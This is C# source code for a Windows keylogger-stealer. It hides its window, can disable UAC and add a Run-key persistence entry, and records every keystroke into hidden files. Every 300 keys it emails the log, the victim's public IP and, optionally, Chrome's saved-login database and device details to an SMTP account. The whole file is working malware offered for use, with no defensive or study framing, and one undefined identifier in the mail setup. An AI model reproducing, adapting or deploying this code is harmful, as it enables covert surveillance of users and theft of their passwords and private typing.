using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net.Mail;
using System.Threading.Tasks;
using System.Management;
using System.Diagnostics;
using Microsoft.Win32;
using System.Drawing;
using System.Security;

namespace firstproject
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("kernel32")]
        extern static UInt64 GetTickCount64();
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        static int NumberOfKeys = 0;
        static string chromerecovery = "chrome_false";
        static string persistence = "persistence_false";
        static string deviceinfo = "deviceinfo_false";
        static string uac = "uac_false";
        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                uint scanCode = MapVirtualKey(vkCode, 0);
                //IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, (IntPtr)0);
                return sb.ToString();
            }
            catch { }
            return ((char)vkCode).ToString();
        }
        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            if (uac == "uac_true")
            {
                Microsoft.Win32.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
            }
            if (persistence == "persistence_true")
            {
                RegistryKey regkey = Registry.CurrentUser;
                regkey = regkey.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"); 
                regkey.SetValue("DService", Environment.CurrentDirectory + "\\" + Process.GetCurrentProcess().ProcessName);
            }
            while (true)
            {
                Thread.Sleep(5);

                for (int i = 0; i < 255; i++)
                {

                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        string key = "";
                        NumberOfKeys++;

                        key = KeyboardLayout(Convert.ToUInt32(i));
                        /*
                        if (i == 8) key = "[BS]";
                        else if (i == 27) key = "[ESC]";
                        else if (i == 127) key = "[DEL]";
                        else if (i == 32) key = "[SPACE]";
                        else if (i == 64) key = "@";
                        else if (i == 20) key = "[CAPS]";
                        else if (i == 15) key = "[Shift off]";
                        else if (i == 16) key = "[Shift on]";
                        else if (i == 17) key = "[Ctrl]";
                        else if (i == 18) key = "[Alt]";
                        else if (i == 9) key = "[TAB]";
                        else if (i == 36) key = "[Home]";
                        else if (i == 37) key = "Left]";
                        else if (i == 38) key = "[Up]";
                        else if (i == 39) key = "[Right]";
                        else if (i == 40) key = "[Down]";
                        else if (i == 44) key = "[Print Screen]";
                        else if (i == 45) key = "[Insert]";
                        else if (i == 46) key = "[Delete]";
                        else if (i == 93) key = "[WIN]";
                        else if (i == 48) key = "0";
                        else if (i == 49) key = "1";
                        else if (i == 50) key = "2";
                        else if (i == 51) key = "3";
                        else if (i == 52) key = "4";
                        else if (i == 53) key = "5";
                        else if (i == 54) key = "6";
                        else if (i == 55) key = "7";
                        else if (i == 56) key = "8";
                        else if (i == 57) key = "9";
                        else if (i == 65) key = "a";
                        else if (i == 66) key = "b";
                        else if (i == 67) key = "c";
                        else if (i == 68) key = "d";
                        else if (i == 69) key = "e";
                        else if (i == 70) key = "f";
                        else if (i == 71) key = "g";
                        else if (i == 72) key = "h";
                        else if (i == 73) key = "i";
                        else if (i == 74) key = "j";
                        else if (i == 75) key = "k";
                        else if (i == 76) key = "l";
                        else if (i == 77) key = "m";
                        else if (i == 78) key = "n";
                        else if (i == 79) key = "o";
                        else if (i == 80) key = "p";
                        else if (i == 81) key = "q";
                        else if (i == 82) key = "r";
                        else if (i == 83) key = "s";
                        else if (i == 84) key = "t";
                        else if (i == 85) key = "u";
                        else if (i == 86) key = "v";
                        else if (i == 87) key = "w";
                        else if (i == 88) key = "x";
                        else if (i == 89) key = "y";
                        else if (i == 90) key = "z";
                        else if (i == 42) key = "*";
                        else if (i == 43) key = "+";
                        else if (i == 61) key = "=";
                        else if (i == 44) key = ",";
                        else if (i == 45) key = "-";
                        else if (i == 39) key = "'";
                        else if (i == 33) key = "!";
                        else if (i == 59) key = ";";
                        else if (i == 47) key = "/";
                        else if (i == 46) key = ".";
                        else if (i == 219) key = "Â´";
                        else if (i == 23) key = "#";
                        else if (i == 95) key = "_";
                        else if (i == 126) key = "~";
                        else if (i == 92) key = "\\";
                        else if (i == 60) key = "<";
                        else if (i == 63) key = "?";
                        else if (i == 62) key = ">";
                        else if (i == 40) key = "(";
                        else if (i == 41) key = ")";
                        else if (i == 94) key = "^";
                        else if (i == 60) key = "<";
                        else if (i == 63) key = "?";
                        else if (i == 124) key = "|";
                        else if (i == 123) key = "{";
                        else if (i == 125) key = "}";
                        else if (i == 37) key = "%";
                        else if (i == 38) key = "&";
                        else if (i == 38) key = "$";
                        else key = ((char)i).ToString();
                        */

                        using (StreamWriter writetext = new StreamWriter("log.txt", true))
                        {
                            File.SetAttributes("log.txt", FileAttributes.Hidden);
                            writetext.Write(key);
                        }
                        using (StreamWriter writetext = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\backup.txt", true))
                        {
                            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\backup.txt", FileAttributes.Hidden);
                            writetext.Write(key);
                        }

                        if ((NumberOfKeys % 300) == 0)
                        {
                            try
                            {
                                string email = Encoding.UTF8.GetString(Convert.FromBase64String("myemail"));
                                string pass_word = Encoding.UTF8.GetString(Convert.FromBase64String("mypassword"));
                                string server = Encoding.UTF8.GetString(Convert.FromBase64String("mysmtp"));
                                int port = 587;
                                SmtpClient client = new SmtpClient(server, port);
                                MailMessage mailMessage = new MailMessage();

                                mailMessage.From = new MailAddress(email);
                                mailMessage.To.Add(email);
                                mailMessage.Subject = new System.Net.WebClient().DownloadString("https://api.ipify.org");
                                string body = File.ReadAllText("log.txt");
                                if (chromerecovery == "chrome_true")
                                {
                                    Process[] chromeInstances = Process.GetProcessesByName("chrome");
                                    foreach (Process p in chromeInstances)
                                        p.Kill();
                                    System.Net.Mail.Attachment attachment;
                                    attachment = new System.Net.Mail.Attachment(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
                                    mailMessage.Attachments.Add(attachment);
                                }
                                if (deviceinfo == "deviceinfo_true")
                                {
                                    RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                                    string pathName = (string)registryKey.GetValue("productName");
                                    body = body + Environment.NewLine + "Time: " + DateTime.Now + ", Sent from: " + pathName + ", Username: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + ", Uptime: " + TimeSpan.FromMilliseconds(GetTickCount64());
                                }

                                client.EnableSsl = SecureSocketsLayer;
                                client.UseDefaultCredentials = false;
                                client.Credentials = new System.Net.NetworkCredential(email, pass_word);
                                mailMessage.Body = body;
                                client.Send(mailMessage);
                                File.SetAttributes("log.txt", FileAttributes.Normal);
                                File.Delete("log.txt");
                            }
                            catch (Exception ex)
                            {
                            }
                        }

                    }

                }
            }
        }
    }
}